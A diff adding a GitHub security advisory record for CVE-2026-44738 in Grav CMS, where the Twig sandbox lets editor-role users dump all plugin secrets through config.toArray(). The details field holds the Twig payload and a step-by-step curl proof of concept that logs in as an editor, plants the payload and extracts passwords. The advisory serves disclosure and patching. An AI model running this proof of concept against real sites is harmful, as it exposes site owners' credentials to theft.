@@ -1,0 +1,68 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-j274-39qw-32c9",
+  "modified": "2026-05-13T15:29:40Z",
+  "published": "2026-05-13T15:29:40Z",
+  "aliases": [
+    "CVE-2026-44738"
+  ],
+  "summary": "Grav: Twig sandbox allows editor-role users to exfiltrate all plugin secrets via Config::toArray()",
+  "details": "## Summary\n\nThe Twig sandbox allow-list permits any user with the `admin.pages` role to call `config.toArray()` from within a page body, dumping the entire merged site configuration — including all plugin secrets (SMTP passwords, AWS keys, OAuth client secrets, API tokens) — into the rendered HTML. No administrator privileges are required.\n\n## Details\n\nThe Twig sandbox allow-list in `system/config/security.yaml` explicitly permits `Config::toArray()` for the `Grav\\Common\\Config\\Config` class:\n\n```yaml\n- class: 'Grav\\Common\\Config\\Config'\n  methods: 'get, toarray, value, default, offsetget, offsetexists'\n```\n\nThe `config` object — which holds the full merged configuration tree including every key under `plugins.*` — is injected into every sandboxed render in `system/src/Grav/Common/Twig/Twig.php` (line 292):\n\n```php\n$twig_vars = [..., 'config' => $config, ...]\n```\n\nAny editor with `admin.pages` can save a page with `process.twig: true` in the frontmatter and the following payload in the body:\n\n```\n{{ config.toArray()|json_encode|raw }}\n```\n\nWhen the page is rendered, the full config tree is dumped as JSON in the HTML, including all plugin secrets stored under `user/config/plugins/*.yaml`.\n\n## PoC\n\n```bash\n# Step 1 — Get login nonce\nNONCE=$(curl -sc /tmp/cookies.txt http://TARGET/admin \\\n  | grep -oP '(?<=name=\"login-nonce\" value=\")[^\"]+')\n\n# Step 2 — Login as editor (no admin.super)\ncurl -sc /tmp/cookies.txt -b /tmp/cookies.txt \\\n  -X POST http://TARGET/admin \\\n  --data-urlencode \"data[username]=EDITOR_USER\" \\\n  --data-urlencode \"data[password]=EDITOR_PASS\" \\\n  --data-urlencode \"task=login\" \\\n  --data-urlencode \"login-nonce=${NONCE}\" -o /dev/null\n\n# Step 3 — Get admin nonce\nADMIN_NONCE=$(curl -s -b /tmp/cookies.txt http://TARGET/admin/pages \\\n  | grep -oP '(?<=admin-nonce\" value=\")[^\"]+' | head -1)\n\n# Step 4 — Save page with process.twig:true and payload\ncurl -s -b /tmp/cookies.txt \\\n  -X POST http://TARGET/admin/pages/poc \\\n  --data-urlencode \"admin-nonce=${ADMIN_NONCE}\" \\\n  --data-urlencode \"task=save\" \\\n  --data-urlencode \"data[frontmatter]=title: poc\nprocess:\n    twig: true\npublished: true\" \\\n  --data-urlencode \"data[content]={{ config.toArray()|json_encode|raw }}\" \\\n  --data-urlencode \"data[folder]=poc\" \\\n  --data-urlencode \"data[route]=/\" \\\n  --data-urlencode \"data[name]=default\" -o /dev/null\n\n# Step 5 — Retrieve secrets from rendered page\ncurl -s http://TARGET/poc | grep -o '\"password\":\"[^\"]*\"'\n```\n\n## Impact\n\nAny user with the editor role (`admin.pages`) can exfiltrate all plugin credentials stored in the site configuration without any administrator privileges. Affected secrets include SMTP passwords, AWS access/secret keys, OAuth client secrets, reCAPTCHA keys, and any API token stored in plugin YAML config. Each extracted credential independently compromises the connected service.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "getgrav/grav"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.0.0-rc.2"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "<= 2.0.0-rc.1"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/getgrav/grav/security/advisories/GHSA-j274-39qw-32c9"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-44738"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/getgrav/grav"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/getgrav/grav/releases/tag/2.0.0-rc.2"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-200"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2026-05-13T15:29:40Z",
+    "nvd_published_at": "2026-05-11T17:16:34Z"
+  }
+}
